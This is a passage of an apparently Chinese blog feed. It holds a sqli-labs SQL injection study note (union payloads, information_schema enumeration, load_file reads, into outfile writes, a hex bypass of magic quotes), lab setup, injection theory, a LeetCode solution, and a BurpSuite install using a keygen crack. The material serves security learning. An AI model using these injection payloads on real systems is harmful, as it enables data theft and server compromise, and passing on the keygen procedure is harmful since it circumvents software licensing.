alt="image.png"></li><li>获取到当前网页的数据库名</li><li><code>?id=-1%20union%20select%201,database(),3</code>3</li><li>获取到当前数据库名为security<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230908154319.png" alt="image.png"></li><li>常见的数据库与用户的对应关系</li><li>这样的好处一个用户对应一个数据库，网站之间的数据不会互相干扰，这是最基础的数据库模型，现在大网站都是分布式数据库<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">数据库A=网站A=数据库用户A——&gt;表名——&gt;列名——&gt;数据</span><br><span class="line">数据库B=网站B=数据库用户B——&gt;表名——&gt;列名——&gt;数据</span><br><span class="line">数据库C=网站C=数据库用户C——&gt;表名——&gt;列名——&gt;数据</span><br></pre></td></tr></table></figure></li><li>在数据库中查询有哪些用户<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use mysql;</span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; <span class="keyword">select</span> host,user,authentication_string from user;</span><br></pre></td></tr></table></figure><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230908155809.png" alt="image.png"></li><li>在源码查看使用的是哪一个用户</li><li>一般网站安装时都会指定数据库二点用户名和密码</li><li>这里指定root用户，密码为空，指定数据库为security<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">db-creds.inc</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">//give your mysql connection username n password</span><br><span class="line"><span class="variable">$dbuser</span> =<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"><span class="variable">$dbpass</span> =<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$dbname</span> =<span class="string">&quot;security&quot;</span>;</span><br><span class="line"><span class="variable">$host</span> = <span class="string">&#x27;localhost&#x27;</span>;</span><br><span class="line"><span class="variable">$dbname1</span> = <span class="string">&quot;challenges&quot;</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></li><li>跨库查询的前提条件是必须<strong>高权限</strong>的用户才能执行跨库查询。</li><li><code>?id=-1%20union%20select%201,schema_name,3%20from%20information_schema.schemata</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230908160951.png" alt="image.png"></li><li>相当于数据库执行<code>select * from users where id=-1 union select 1,schema_name,3 from information_schema.schemata limit 0,1;</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230908164510.png" alt="image.png"></li></ul><h2 id="获取到所有的数据库名称"><a href="#获取到所有的数据库名称" class="headerlink" title="获取到所有的数据库名称"></a>获取到所有的数据库名称</h2><ul><li><code>union%20select%201,group_concat(schema_name),3%20from%20information_schema.schemata</code></li><li><code>group_concat()</code>将分组中的字符串与各种选项进行连接<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230908164653.png" alt="image.png"></li><li>相当于数据库执行&#96;select * from users where id&#x3D;-1 union select 1,group_concat(schema_name),3 from information_schema.schemata;<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230908165412.png" alt="image.png"></li></ul><h2 id="指定获取book库中的表名信息"><a href="#指定获取book库中的表名信息" class="headerlink" title="指定获取book库中的表名信息"></a>指定获取book库中的表名信息</h2><ul><li><code>union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;book&#39;</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230908165653.png" alt="image.png"></li><li>相当于数据库执行命令<code>select * from users where id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;book&#39;;</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230908170204.png" alt="image.png"></li></ul><h2 id="获取指定数据库book下的book表的列名信息"><a href="#获取指定数据库book下的book表的列名信息" class="headerlink" title="获取指定数据库book下的book表的列名信息"></a>获取指定数据库book下的book表的列名信息</h2><ul><li><code>union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;book&#39; and table_schema=&#39;book&#39;</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230908170625.png" alt="image.png"></li><li>相当于数据库命令<code>select * from users where id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;book&#39; and table_schema=&#39;book&#39;;</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230908170859.png" alt="image.png"></li></ul><h2 id="查询到指定数据"><a href="#查询到指定数据" class="headerlink" title="查询到指定数据"></a>查询到指定数据</h2><ul><li>union  select book_id,book_title,book_author from book.book<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230908172628.png" alt="image.png"></li><li>数据库命令<code>select * from users where id=-1 union select book_id,book_title,book_author from book.book;</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230908172716.png" alt="image.png"></li></ul><h2 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h2><ul><li>username和password字段是users表中的字段，又因为查询到的数据为空，执行后面的联合字句的时候将内容填充到下面，所以获取到的内容并不是十分准确，另外要内容十分准确必须要满足book表和user表的结构完全相同</li></ul><h1 id="文件读写函数"><a href="#文件读写函数" class="headerlink" title="文件读写函数"></a>文件读写函数</h1><ul><li><code>load_file</code>文件读取</li><li><code>into outfile</code>或<code>into dumpfile</code>文件</li><li>获取路径的常见方法：报错显示、遗漏文件、漏洞报错、平台配置文件、爆破等</li><li>报错显示：当网站出现错误的时候，在报错显示当中可能就会包含文件的路径</li><li>遗漏文件：在网站建立的时候会有<code>phpinfo.php</code>文件，通常用于建立网站时使用，当中会包含文件路径</li><li>漏洞报错：通过网站漏洞，爆路径的方式</li><li>平台配置文件：通过读取文件来读取网站的配置文件，通常是默认的路径，如果改了那就很难找到</li><li>爆破：通常是没办法的时候，通过一个一个试的方式</li><li>通过工具扫描通常就能发现很多错误，通常就会包括路径</li></ul><h2 id="查询是否有写入的权限"><a href="#查询是否有写入的权限" class="headerlink" title="查询是否有写入的权限"></a>查询是否有写入的权限</h2><ul><li><code>show global variables like &#39;%secure_file_priv%&#39;;</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230908220011.png" alt="image.png"></li><li>NULL：不允许导入或导出</li><li>&#x2F;tmp：只允许在 &#x2F;tmp 目录导入导出</li><li>空：不限制目录</li><li>在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件</li><li>在 MySQL 5.5之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件</li></ul><h2 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h2><ul><li>在网页源代码中可以看到被读取的文件内容</li><li>这里读取了数据库的配置信息<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230908222348.png" alt="image.png"></li><li>数据库命令的内容<code>select load_file();</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230908222558.png" alt="image.png"></li><li>读取敏感信息：<a href="https://blog.csdn.net/weixin_30292843/article/details/99381669">https://blog.csdn.net/weixin_30292843/article/details/99381669</a></li></ul><h2 id="文件写入"><a href="#文件写入" class="headerlink" title="文件写入"></a>文件写入</h2><ul><li><code>?id=-1%20union%20select%201,%27zys%27,3%20into%20outfile%20%27D:/zys.txt%27--+</code></li><li>最后面的<code>--+</code>用于注释掉后面的内容<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230908223157.png" alt="image.png"></li><li>数据库命令<code>select &#39;zys&#39; into outfile &#39;D:/zys.txt&#39;;</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230908223449.png" alt="image.png"></li><li>D盘当中就生成了这个文件<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230908223505.png" alt="image.png"></li></ul><h1 id="魔法引号开关"><a href="#魔法引号开关" class="headerlink" title="魔法引号开关"></a>魔法引号开关</h1><ul><li>魔术引号设计的初衷是为了让从数据库或文件中读取数据和从请求中接收参数时，<strong>对单引号、双引号、反斜线、NULL</strong>加上<strong>一个一个反斜线进行转义</strong>，这个的作用跟addslashes()的作用完全相同。</li><li>正确地接收和读取数据，从而正确地执行SQL语句，防止恶意的SQL注入。</li></ul><h2 id="取消原因："><a href="#取消原因：" class="headerlink" title="取消原因："></a>取消原因：</h2><ul><li>在PHP5.4.0版本之后就取消了，原因</li><li>（1）可移植性:</li><li>编程时认为其打开或并闭都会影响到移植性。可以用 get_magic_quotes_gpc() 来检查是否打开，并据此编程。</li><li>（2）性能：</li><li>由于并不是每一段被转义的数据都要插入数据库的，如果所有进入 PHP 的数据都被转义的话，那么会对程序的执行效率产生一定的影响。在运行时调用转义函数（如 addslashes()）更有效率。 尽管 php.ini-dist 默认打开了这个选项，但是 php.ini-recommended 默认却关闭了它，主要是出于性能的考虑。</li><li>（3）方便：</li><li>由于不是所有数据都需要转义，在不需要转义的地方看到转义的数据就很烦。比如说通过表单发送邮件，结果看到一大堆的 ‘。针对这个问题，可以使用 stripslashes() 函数处理。</li></ul><h2 id="开关"><a href="#开关" class="headerlink" title="开关"></a>开关</h2><ul><li>在php的配置文件<code>php.ini</code>当中，<code>magic_quotes_gpc</code>为魔法引号的开关<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230908225943.png" alt="image.png"></li></ul><h2 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h2><ul><li>采用hex(16进制)编码绕过</li><li>因为对路径进行编码之后，不再需要单引号了，魔术引号不会再对其生效，也就是说绕过了魔术引号的作用达到绕过。</li><li>编码软件:winhex</li></ul><h1 id="int函数"><a href="#int函数" class="headerlink" title="int函数"></a>int函数</h1><ul><li>判断输入的是否为数字</li><li>判断数字基本上没办法绕过，因为没办法在纯数字当中注入内容<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_int</span>(<span class="variable">$id</span>))&#123;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$sql</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;ni shi ge jj?&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/sqlzhuruint.png" alt="sqlzhuruint.png"></li><li>防护软件一般也是对关键字进行防护、触发了waf等安全软件规则会将数据包丢弃。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 小迪安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> MYSQL注入 </tag>
            
            <tag> 小迪安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sqli-labs安装教程</title>
      <link href="/2023/09/07/Sqli-labs%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/"/>
      <url>/2023/09/07/Sqli-labs%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="Sqli-labs简介"><a href="#Sqli-labs简介" class="headerlink" title="Sqli-labs简介"></a>Sqli-labs简介</h1><ul><li>Sqli-labs 是一个印度程序员写的，用来学习 sql 注入的一个游戏教程。</li><li>Sqli-labs是一个帮你总结大部分SQL注入漏洞类型的靶场，学习SQL注入漏洞原理，复现SQL注入漏洞必备靶场环境。</li></ul><h1 id="Sqli-labs下载"><a href="#Sqli-labs下载" class="headerlink" title="Sqli-labs下载"></a>Sqli-labs下载</h1><ul><li>这里提供Github的项目地址：<a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a></li><li>如果打不开就打开代理</li></ul><h1 id="Sqli-labs安装"><a href="#Sqli-labs安装" class="headerlink" title="Sqli-labs安装"></a>Sqli-labs安装</h1><ul><li>首先，需要安装apache+mysql+php的环境，建议在Windows当中安装phpstudy进行搭建</li><li>将下载好的源码压缩包，解压到phpstudy&#x2F;WWW目录下，如果出现文件重复是否替换的提示，选择是就可以了。<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230907143540.png" alt="image.png"></li></ul><h1 id="Sqli-labs配置"><a href="#Sqli-labs配置" class="headerlink" title="Sqli-labs配置"></a>Sqli-labs配置</h1><ul><li>在<code>WWW/sqli-labs-master/sql-connections</code>文件夹当中，找到<code>db-creds.inc</code>文件，使用notepad++打开编辑<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230907143811.png" alt="image.png"></li><li>在<code>user</code>和<code>pass</code>两项中填写数据库的账户和密码，默认账户和密码都是<code>root</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230907143932.png" alt="image.png"></li><li>如果不知道账户密码的，在phpstudy的数据库一栏中查看<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230907144145.png" alt="image.png"></li><li>在浏览器输入<a href="http://localhost/sqli-labs-master/">http://localhost/sqli-labs-master/</a>就可以打开靶场了<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230907144403.png" alt="image.png"></li><li>点击<code>Setup/reset Database for labs</code>开始自动配置，显示以下画面则是安装成功了<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230907144531.png" alt="image.png"></li><li>接下来就可以开始进入关卡了</li></ul><h1 id="安装时遇到的问题"><a href="#安装时遇到的问题" class="headerlink" title="安装时遇到的问题"></a>安装时遇到的问题</h1><ul><li>这是我遇到的问题，内容翻译的意思就是有无法识别的字符<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/2fea01f4fbdf21ca933eeefa5f9a5e6.png" alt="2fea01f4fbdf21ca933eeefa5f9a5e6.png"></li><li>出现这个情况可能是字符集不适配，我们在phpstudy首页，现在mysql的配置，将字符集设置为<code>utf8</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230907144911.png" alt="image.png"></li><li>如果问题仍然没有解决，可以尝试降低php的版本，建议安装5.4.45版本，在phpstudy软件管理当中下载相应版本，然后在网站栏对应的网站点击管理更换php的版本<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230907145141.png" alt="image.png"></li></ul>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 工具 </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> Sqli-labs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Day12WEB漏洞-SQL注入之简要SQL注入</title>
      <link href="/2023/09/06/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%20Day12WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%AE%80%E8%A6%81SQL%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/09/06/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%20Day12WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%AE%80%E8%A6%81SQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<ul><li>在本系列课程学习中，SQL注入漏洞将是重点部分，其中SQL注入又非常复杂，区分各种数据库类型，提交方法，数据类型等注入，我们需要按部就班的学习，才能学会相关SQL注入的核心。同样此类漏洞是WEB安全中严重的安全漏洞，学习如何利用，挖掘，修复也是很重要的。<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230904153157.png" alt="image.png"></li></ul><h1 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h1><h2 id="理解SQL注入"><a href="#理解SQL注入" class="headerlink" title="理解SQL注入"></a>理解SQL注入</h2><ol><li>SQL注入是一种将SQL代码插入或添加到应用（用户）的输入参数中的攻击，之后再将这些参数传递给后台的sql服务器加以解析和执行。由于sql语句本身的多样性，以及可用于构造sql语句的编程方法很多，因此凡是构造sql语句的步骤均存在被攻击的潜在风险。Sql注入的方式主要是直接将代码插入参数中，这些参数会被置入sql命令中加以执行。间接的攻击方式是将恶意代码插入字符串中，之后将这些字符串保存到数据库的数据表中或将其当成元数据。当将存储的字符串置入动态sql命令中时，恶意代码就将被执行。</li><li>如果web应用未对动态构造的sql语句使用的参数进行正确性审查（即便使用了参数化技术），攻击者就很可能会修改后台sql语句的构造。如果攻击者能够修改sql语句，那么该语句将与应用的用户具有相同的权限。当使用sql服务器执行与操作系统交互命令时，该进程将与执行命令的组件（如数据库服务器、应用服务器或web服务器）拥有相同的权限，这种权限的级别通常很高。如果攻击者执行以上恶意代码的插入操作成功，那么用户数据库服务器或者整个应用会遭到破坏，甚至被控制。</li></ol><h2 id="SQL注入的产生过程及常见原因"><a href="#SQL注入的产生过程及常见原因" class="headerlink" title="SQL注入的产生过程及常见原因"></a>SQL注入的产生过程及常见原因</h2><h3 id="产生过程"><a href="#产生过程" class="headerlink" title="产生过程"></a>产生过程</h3><ul><li>大多数的web应用都需要与数据库进行交互，并且大多数web应用编程语言（如ASP、C##、.NET、Java和PHP）均提供了可编程的方法来与数据库连接并进行交互。如果web应用开发人员无法确保在将从web表单，cookie及输入参数等收到的值传递给sql查询（该查询在数据库服务器上执行）之前已经对其进行过验证，那么通常会出现sql注入漏洞，如果攻击者能够控制发送给sql查询的输入，并且能够操纵该输入将其解析为代码而非数据，那么攻击者就很有可能有能力在后台数据库执行该代码。</li></ul><h3 id="常见的sql注入产生原因"><a href="#常见的sql注入产生原因" class="headerlink" title="常见的sql注入产生原因"></a>常见的sql注入产生原因</h3><ul><li>基于此，SQL注入的产生原因通常表现在以下几方面：</li></ul><ol><li>转义字符处理不合适；</li><li>不安全的数据库配置；</li><li>不合理的查询集处理；</li><li>不当的错误处理；</li><li>多个提交处理不当。</li></ol><h4 id="不当的处理类型"><a href="#不当的处理类型" class="headerlink" title="不当的处理类型"></a>不当的处理类型</h4><ul><li>Sql数据库将单引号字符（’）解析成代码与数据间的分界线：单引号外面的内容均是需要运行的代码，而用单引号引起来的内容均是数据。因为只需要简单的在URL或WEB页面的字段中输入一个单引号，就能很快速的识别出web站点是否会受到sql注入攻击。</li></ul><h4 id="不安全的数据库配置"><a href="#不安全的数据库配置" class="headerlink" title="不安全的数据库配置"></a>不安全的数据库配置</h4><ul><li>数据库带有很多默认的用户预安装内容。SQL Server使用声名狼藉的“sa”作为数据库系统管理员账户，MySQL使用“root”和“anonymous”用户账户，Oracle则在创建数据库时通常会创建SYS、SYSTEM、DBSNMP和OUTLN账户。这些并非是全部的账号，只是比较出名的账户中的一部分，还有很多其他的账户。其他账户同样按默认方式进行预设，口令众所周知。</li><li>这就带来了很大的安全风险，攻击者利用sql注入漏洞时，通常会常识访问数据库的元数据，比如内部的数据库和表的名称、列的数据类型和访问权限，例如MySQL服务器的元数据位于information_schema虚拟数据库中，可通过show databases；和show tables；命令访问。所有的MySQL用户均有权限访问该数据库中的表，但只能查看表中那些与该用户访问权限相对应的对象的行。</li></ul><h4 id="不合理的查询集处理"><a href="#不合理的查询集处理" class="headerlink" title="不合理的查询集处理"></a>不合理的查询集处理</h4><ul><li>有时需要使用动态的sql语句对某些复杂的应用进行编码，因为程序开发阶段可能还不知道要查询的表或字段（或者不存在）。比如与大型数据库交互的应用，这些数据库在定期创建的表中的数据由于应用已经产生了输入，因而开发人员会信任该数据，攻击者可以使用自己的表和字段数据来替换应用产生的值，从而影响系统的返回值。</li></ul><h4 id="不当的错误处理"><a href="#不当的错误处理" class="headerlink" title="不当的错误处理"></a>不当的错误处理</h4><ul><li>错误处理不当会为web站点带来很多安全方面的问题。最常见的问题是将详细的内部错误消息（如错误代码，数据库转存储）显示给用户或攻击。这些错误消息会泄露实现细节，为攻击者提供与网站潜在缺陷相关的重要线索。</li></ul><h4 id="多个提交处理不当"><a href="#多个提交处理不当" class="headerlink" title="多个提交处理不当"></a>多个提交处理不当</h4><ul><li><p>大型的web开发项目会出现这样的问题：有些开发人员会对输入进行验证，而一些开发人员则不以为然。对于开发人员，团队，甚至公司来说，彼此独立工作的情形并不少见，很难保证项目中每个人都遵循相同的标准。  </p></li><li><p>应用的开发人员还倾向于围绕用户来设计应用，他们尽可能的使用预期的处理流程来引导用户，认为用户将遵循他们已经设计好的逻辑顺序。</p></li><li><p>例如：当用户已到达一系列表单中的第三个表单时，他们会期望用户肯定已经完成第一个和第二个表达。但实际上，借助URL乱序来请求资源，能够非常容易的避开预期的数据流程。</p></li></ul><h1 id="二、MYSQL注入"><a href="#二、MYSQL注入" class="headerlink" title="二、MYSQL注入"></a>二、MYSQL注入</h1><ul><li>mysql注入的思维导图<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230904200119.png" alt="image.png"></li></ul><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><ul><li>信息收集主要是收集数据库里面的信息，包括操作系统、数据库名、数据库用户、数据库版本、网站路径等</li><li>数据库用户指的是数据库的管理员，包括账号密码</li><li>路径主要是指网站源码的路径，不同操作系统的路径不一样</li></ul><h2 id="数据注入"><a href="#数据注入" class="headerlink" title="数据注入"></a>数据注入</h2><ul><li>高版本的数据库使用有据查询，就是有根据地查询</li><li>低版本则是暴力查询，就是能搞就搞，搞不出来就算了的</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 小迪安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 小迪安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>力扣 No.70爬楼梯</title>
      <link href="/2023/09/05/%E5%8A%9B%E6%89%A3%20No.70%E7%88%AC%E6%A5%BC%E6%A2%AF/"/>
      <url>/2023/09/05/%E5%8A%9B%E6%89%A3%20No.70%E7%88%AC%E6%A5%BC%E6%A2%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><ul><li>假设你正在爬楼梯。需要 <code>n</code> 阶你才能到达楼顶。</li><li>每次你可以爬 <code>1</code> 或 <code>2</code> 个台阶。你有多少种不同的方法可以爬到楼顶呢？</li><li>使用C++</li><li><strong>示例 1：</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">输入：n = 2</span><br><span class="line">输出：2</span><br><span class="line">解释：有两种方法可以爬到楼顶。</span><br><span class="line">1. 1 阶 + 1 阶</span><br><span class="line">2. 2 阶</span><br></pre></td></tr></table></figure></li><li><strong>示例 2：</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">输入：n = 3</span><br><span class="line">输出：3</span><br><span class="line">解释：有三种方法可以爬到楼顶。</span><br><span class="line">1. 1 阶 + 1 阶 + 1 阶</span><br><span class="line">2. 1 阶 + 2 阶</span><br><span class="line">3. 2 阶 + 1 阶</span><br></pre></td></tr></table></figure></li><li><strong>示例3：</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">输入：n = 4</span><br><span class="line">输出：5</span><br><span class="line">解释：有五种方法可以爬到楼顶。</span><br><span class="line">1. 1 阶 + 1 阶 + 1 阶 + 1 阶</span><br><span class="line">2. 1 阶 + 2 阶 + 1 阶</span><br><span class="line">3. 2 阶 + 1 阶 + 1 阶</span><br><span class="line">4. 1 阶 + 1 阶 + 2 阶</span><br><span class="line">5. 2 阶 + 2 阶</span><br></pre></td></tr></table></figure></li><li>难度属于简单，题目官方的解答啰哩吧嗦的，我就按照自己的想法说说吧</li></ul><h1 id="动态规划"><a href="#动态规划" class="headerlink" title="动态规划"></a>动态规划</h1><ul><li>每次可以选择登一阶或者两阶</li><li>我们发现第<code>n</code>阶的登顶方法数都是在<code>n-1</code>阶基础上<code>+1</code>，以及在<code>n-2</code>阶的基础上<code>+2</code>，所以这阶的方法数就是前两阶之和</li><li>用这个方法我们知道，在0阶设为1种，在1阶是1种，在2阶则是2种（因为1+1&#x3D;2），以此类推第三阶则是3种（1+2&#x3D;3）</li><li>由此则是动态规划算法<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">climbStairs</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> p = <span class="number">0</span>, q = <span class="number">0</span>, r = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</span><br><span class="line">            p = q;</span><br><span class="line">            q = r;</span><br><span class="line">            r = p + q;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li>时间复杂度：O(n)</li><li>空间复杂度：O(1)</li></ul>]]></content>
      
      
      <categories>
          
          <category> 力扣题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
            <tag> 力扣 </tag>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BurpSuite安装教程</title>
      <link href="/2023/09/04/BurpSuite%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/"/>
      <url>/2023/09/04/BurpSuite%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<ul><li>Burp Suite 是用于攻击web 应用程序的集成平台，包含了许多工具。Burp Suite为这些工具设计了许多接口，以加快攻击应用程序的过程。所有工具都共享一个请求，并能处理对应的HTTP 消息、持久性、认证、代理、日志、警报。</li></ul><h1 id="下载BurpSuite"><a href="#下载BurpSuite" class="headerlink" title="下载BurpSuite"></a>下载BurpSuite</h1><ul><li>这里我在网上找到的资源，是百度网盘下载的，如果觉得下载太慢可以自行搜索其他资源</li><li>网盘链接：<a href="https://pan.baidu.com/s/11lrFGT0aGCd4BQcAJrL55w">https://pan.baidu.com/s/11lrFGT0aGCd4BQcAJrL55w</a></li><li>提取码：w5lg<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230904204902.png" alt="image.png"></li><li>文件目录，不建议在中文目录下</li></ul><h1 id="安装jdk"><a href="#安装jdk" class="headerlink" title="安装jdk"></a>安装jdk</h1><ul><li>这个资源包提供了配套的jdk，我们可以直接使用这个jdk安装就行</li><li>如果电脑本身就有Java的也可以安装，因为原有的Java版本不一定适配</li><li>由于Java环境配置特别麻烦，所以我直接给个<a href="https://www.runoob.com/java/java-environment-setup.html">非常详细的教程</a>吧，直接跳到配置环境变量那里</li><li>配置完成在<code>cmd</code>中键入<code>java -version</code>，就可以看见以下内容，说明安装配置成功<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230904205305.png" alt="image.png"></li></ul><h1 id="安装BurpSuite"><a href="#安装BurpSuite" class="headerlink" title="安装BurpSuite"></a>安装BurpSuite</h1><ul><li>首先右键资源包内的<code>burp-loader-keygen.jar</code>，使用Java打开<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230904205549.png" alt="image.png"></li><li>点击<code>运行薄荷.vbs</code>，弹出来一个窗口<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230904210557.png" alt="image.png"></li></ul><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230904205855.png" alt="image.png"></p><ul><li>将大窗口<code>license</code>内的内容复制到小窗口内，点击Next<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230904210022.png" alt="image.png"></li><li>然后点击<code>Manual activation(手动激活)</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230904210127.png" alt="image.png"></li><li>将小窗口第二栏的内容复制到大窗口的第二栏</li><li>大窗口第三栏会出现内容，复制粘贴到小窗口的第三栏</li><li>点击Next就安装完成了</li><li>再次打开<code>运行薄荷.vbs</code>就可以看到<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230904210641.png" alt="image.png"></li><li>以后允许就打开这个</li><li>但是很难找所以可以给它创建一个快捷方式</li></ul><h1 id="浏览器配置"><a href="#浏览器配置" class="headerlink" 